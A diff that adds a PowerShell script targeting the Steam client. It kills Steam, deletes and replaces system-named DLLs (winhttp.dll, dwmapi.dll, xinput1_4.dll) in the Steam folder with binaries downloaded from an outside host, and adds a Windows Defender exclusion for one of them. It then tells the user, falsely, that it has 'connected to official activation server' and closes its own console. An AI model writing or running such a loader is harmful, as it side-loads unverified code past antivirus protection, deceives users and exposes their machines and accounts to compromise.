@@ -1,0 +1,169 @@
+cls
+[Console]::InputEncoding = [System.Text.Encoding]::UTF8
+
+$localPath = Join-Path $env:LOCALAPPDATA "steam"
+$steamRegPath = 'HKCU:\Software\Valve\Steam'
+$steamToolsRegPath = 'HKCU:\Software\Valve\Steamtools'
+$steamPath = ""
+
+function Remove-ItemIfExists($path) {
+    if (Test-Path $path) {
+
+        # İzinleri varsayılan hale döndür (gerekirse sahipliği de düzeltir)
+        Start-Process cmd -ArgumentList "/c icacls `"$path`" /reset /T /C" -WindowStyle Hidden -Wait
+
+        # -s (system), -h (hidden), -r (read-only) kaldır
+        Start-Process cmd -ArgumentList "/c attrib -s -h -r `"$path`"" -WindowStyle Hidden -Wait
+
+        # Sil
+        Remove-Item -Path $path -Force -ErrorAction SilentlyContinue
+    }
+}
+
+
+function ForceStopProcess($processName) {
+    Get-Process $processName -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
+    Start-Sleep -Seconds 2
+    if (Get-Process $processName -ErrorAction SilentlyContinue) {
+        Start-Process cmd -ArgumentList "/c taskkill /f /im $processName.exe" -WindowStyle Hidden -ErrorAction SilentlyContinue
+    }
+}
+
+function CheckAndPromptProcess($processName, $message) {
+    while (Get-Process $processName -ErrorAction SilentlyContinue) {
+        Write-Host $message -ForegroundColor Red
+        Start-Sleep 1.5
+    }
+}
+
+$filePathToDelete = Join-Path $env:USERPROFILE "get.ps1"
+Remove-ItemIfExists $filePathToDelete
+
+ForceStopProcess "steam"
+if (Get-Process "steam" -ErrorAction SilentlyContinue) {
+    CheckAndPromptProcess "Steam" "[Please exit Steam client first]"
+}
+
+if (Test-Path $steamRegPath) {
+    $properties = Get-ItemProperty -Path $steamRegPath -ErrorAction SilentlyContinue
+    if ($properties -and 'SteamPath' -in $properties.PSObject.Properties.Name) {
+        $steamPath = $properties.SteamPath
+    }
+}
+if ([string]::IsNullOrWhiteSpace($steamPath)) {
+    Write-Host "Official Steam client is not installed on your computer. Please install it and try again." -ForegroundColor Red
+    Start-Sleep 10
+    exit
+}
+
+if (-not (Test-Path $steamPath -PathType Container)) {
+    Write-Host "Official Steam client is not installed on your computer. Please install it and try again." -ForegroundColor Red
+    Start-Sleep 10
+    exit
+}
+
+$steamConfigPath = Join-Path $steamPath "config"
+
+$veroldPath = Join-Path $steamPath "version.dll"
+        
+Remove-ItemIfExists $veroldPath
+
+$user32Path = Join-Path $steamPath "version.dll"
+        
+Remove-ItemIfExists $user32Path
+
+$verPath = Join-Path $steamPath "winhttp.dll"
+Remove-ItemIfExists $verPath
+
+$DWMPath = Join-Path $steamPath "dwmapi.dll"
+        
+Remove-ItemIfExists $DWMPath
+
+$xinputPath = Join-Path $steamPath "xinput1_4.dll"
+        
+Remove-ItemIfExists $xinputPath
+
+function PwStart() {
+    try {
+        if (!$steamPath) {
+            return
+        }
+        if (!(Test-Path $localPath)) {
+            New-Item $localPath -ItemType directory -Force -ErrorAction SilentlyContinue
+        }
+
+        $steamCfgPath = Join-Path $steamPath "steam.cfg"
+        Remove-ItemIfExists $steamCfgPath
+
+        $steamBetaPath = Join-Path $steamPath "package\beta"
+        Remove-ItemIfExists $steamBetaPath
+
+        $catchPath = Join-Path $env:LOCALAPPDATA "Microsoft\Tencent"
+        Remove-ItemIfExists $catchPath
+        
+        try { Add-MpPreference -ExclusionPath $verPath -ErrorAction SilentlyContinue } catch {}
+
+        $versionDllPath = Join-Path $steamPath "version.dll"
+        Remove-ItemIfExists $versionDllPath
+
+        
+
+        $downloadverDll = "https://zdb1.pages.dev/winhttp.dll"
+
+        try {
+            Invoke-RestMethod -Uri $downloadverDll -OutFile $verPath -ErrorAction Stop
+        } catch {
+            if (Test-Path $verPath) {
+                Move-Item -Path $verPath -Destination "$verPath.old" -Force -ErrorAction SilentlyContinue
+                Invoke-RestMethod -Uri $downloadverDll -OutFile $verPath -ErrorAction SilentlyContinue
+            }
+        }
+        $downloadDWMDll = "https://zdb1.pages.dev/dwmapi.dll"
+
+        try {
+            Invoke-RestMethod -Uri $downloadDWMDll -OutFile $DWMPath -ErrorAction Stop
+        } catch {
+            if (Test-Path $DWMPath) {
+                Move-Item -Path $DWMPath -Destination "$DWMPath.old" -Force -ErrorAction SilentlyContinue
+                Invoke-RestMethod -Uri $downloadDWMDll -OutFile $DWMPath -ErrorAction SilentlyContinue
+            }
+        }
+
+        $downloadxinputDll = "https://zdb1.pages.dev/xinput1_4.dll"
+
+        try {
+            Invoke-RestMethod -Uri $downloadxinputDll -OutFile $xinputPath -ErrorAction Stop
+        } catch {
+            if (Test-Path $xinputPath) {
+                Move-Item -Path $xinputPath -Destination "$xinputPath.old" -Force -ErrorAction SilentlyContinue
+                Invoke-RestMethod -Uri $downloadxinputDll -OutFile $xinputPath -ErrorAction SilentlyContinue
+            }
+        }
+
+
+        $steamExePath = Join-Path $steamPath "steam.exe"
+        Start-Process $steamExePath
+        Start-Process "steam://"
+        Write-Host "[Successfully connected to official activation server. Please login to Steam to activate]" -ForegroundColor Green
+
+        for ($i = 5; $i -ge 0; $i--) {
+            Write-Host "`r[This window will close in $i seconds...]" -NoNewline
+            Start-Sleep -Seconds 1
+        }
+
+        $instance = Get-CimInstance Win32_Process -Filter "ProcessId = '$PID'"
+        while ($null -ne $instance -and -not($instance.ProcessName -ne "powershell.exe" -and $instance.ProcessName -ne "WindowsTerminal.exe")) {
+            $parentProcessId = $instance.ProcessId
+            $instance = Get-CimInstance Win32_Process -Filter "ProcessId = '$($instance.ParentProcessId)'"
+        }
+        if ($null -ne $parentProcessId) {
+            Stop-Process -Id $parentProcessId -Force -ErrorAction SilentlyContinue
+        }
+
+        exit
+
+    } catch {
+    }
+}
+
+PwStart
